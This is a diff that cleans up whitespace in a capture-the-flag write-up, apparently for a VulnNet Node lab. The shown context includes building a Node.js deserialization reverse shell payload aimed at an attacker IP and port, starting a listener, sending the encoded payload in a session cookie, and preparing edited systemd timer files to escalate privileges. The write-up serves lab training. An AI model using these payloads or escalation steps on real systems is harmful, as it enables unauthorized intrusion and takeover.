@@ -50,8 +50,8 @@ css                  (Status: 301) [Size: 173] [--> /css/]
 img                  (Status: 301) [Size: 173] [--> /img/]
 login                (Status: 200) [Size: 2127]
 Progress: 20469 / 20469 (100.00%)
-===============================================================                                                                        
-Finished                                                                                                                               
+===============================================================
+Finished
 ===============================================================
 ```
 
@@ -133,7 +133,7 @@ We will use this "*https://github.com/ajinabraham/Node.Js-Security-Course/blob/m
 Genearate a reverse shell payload.
 
 ```bash
-kali@kali:python2 nodejsshell.py 192.168.130.26 4444                                                                                         
+kali@kali:python2 nodejsshell.py 192.168.130.26 4444
 [+] LHOST = 192.168.130.26
 [+] LPORT = 4444
 [+] Encoding
@@ -156,7 +156,7 @@ eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2Rl....
 Start a listener on the attacker machine.
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                   
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.71 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
@@ -171,7 +171,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
-Cookie: session=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMz.....MCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9%3D%3D
+Cookie: session=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVu.....ODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9%3D%3D
 Upgrade-Insecure-Requests: 1
 If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
 Priority: u=0, i
@@ -188,7 +188,7 @@ kali@kali:penelope -p 4444
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
 [+] Logging to /home/kali/.penelope/sessions/ip-10-48-153-128~10.48.153.128-Linux-x86_64/2026_02_06-11_07_04-380.log 📜
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www@ip-10-48-153-128:~/VulnNet-Node$ 
 ```
 
@@ -259,7 +259,7 @@ serv-manage@ip-10-48-153-128:/etc/systemd/system$ ls -la | grep vulnnet
 We have both read and write access to both scripts.
 
 ```bash
-serv-manage@ip-10-48-153-128:/etc/systemd/system$ cat vulnnet-auto.timer 
+serv-manage@ip-10-48-153-128:/etc/systemd/system$ cat vulnnet-auto.timer
 [Unit]
 Description=Run VulnNet utilities every 30 min
 
@@ -276,7 +276,7 @@ WantedBy=basic.target
 So, this scripts run vulnet-job.service every 30 minutes.
 
 ```bash
-serv-manage@ip-10-48-153-128:/etc/systemd/system$ cat vulnnet-job.service 
+serv-manage@ip-10-48-153-128:/etc/systemd/system$ cat vulnnet-job.service
 [Unit]
 Description=Logs system statistics to the systemd journal
 Wants=vulnnet-auto.timer
@@ -295,15 +295,15 @@ Now, we can edit those scripts as our wish.
 Create a updated scripts on your attacker machine.
 
 ```bash
-kali@kali:cat vulnnet-auto.timer                                                                                                             
+kali@kali:cat vulnnet-auto.timer
 [Unit]
 Description=Run VulnNet utilities every 30 min
- 
+
 [Timer]
 OnBootSec=0min
 OnCalendar=*:0/1
 Unit=vulnnet-job.service
- 
+
 [Install]
 WantedBy=basic.target
 ```
